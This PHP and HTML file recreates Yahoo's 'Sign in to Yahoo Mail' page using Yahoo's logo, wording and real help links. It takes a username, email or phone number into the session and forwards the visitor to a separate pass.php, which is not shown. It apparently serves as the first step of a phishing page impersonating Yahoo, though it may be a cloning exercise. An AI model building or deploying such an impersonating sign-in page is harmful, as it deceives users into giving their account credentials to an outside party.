<?php
    session_start();
    $uname_email_pno= "";
    $empty_err= $uname_email_pno_err= "";

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["login_id"]))
        {
            $empty_err= "Sorry, we don't recognise this email address.";
        }
        else{
            $_SESSION['login_id']=htmlspecialchars($_POST["login_id"]);
            $uname_email_pno= $_SESSION['login_id'];
            if( filter_var($uname_email_pno, FILTER_VALIDATE_EMAIL) or  (preg_match("/^[0-9]{10}+$/", $uname_email_pno)))
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
            else
            {
                $uname_email_pno_err="Invalid Input.";
            }
        }
    }    
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="navigation_bar">
        <div class="nav_left">
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
        </div>
        <div class="nav_right">
            <a href="https://in.help.yahoo.com/kb/account" id="nav1">Help</a>
            <a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" id="nav2">Terms</a>
            <a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" id="nav3">Privacy</a>
        </div>
    </div>

    <div class="full_screen">
        <div class="container_left">
            <h1>Yahoo makes it easy to enjoy what matters most in your world</h1>
            <p class="bg_content">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sports, music, films, more. You get more out of the web; you get more out of life.</p>
        </div>

        <div class="container">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="container_logo " width="" height="25">   
            <p class="container_header">Sign in to Yahoo Mail</p>
            <p class="container_sub-header">Sign in using your Yahoo account</p>      
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">      
                <label for="login_id" id = "placeholder_text">Username, email, or mobile</label>
                <input type="text" id="login_id" name="login_id" placeholder="Username, email, or mobile" size = "30" autofocus>
                <hr color ="blue">
                <span class="php_error"><?php echo $empty_err , $uname_email_pno_err ?></span>
                <button type="submit" class="next" >Next</button><br> 
                <input type="checkbox" id="checkbox"> 
                <label for="checkbox">Stay signed in</label>
                <a href="https://login.yahoo.com/account/challenge/username?done=https%3A%2F%2Fwww.yahoo.com%2F&authMechanism=secondary&sessionIndex=RA--" id="forgot_uname">Forgotten username?</a><br>
            
                <button class="create_acc" onclick="location.href='https://login.yahoo.com/account/create?specId=yidregsimplified&done=https%3A%2F%2Fwww.yahoo.com';">Create an account</button>
            </form>
        </div>

    </div>
</body>
</html>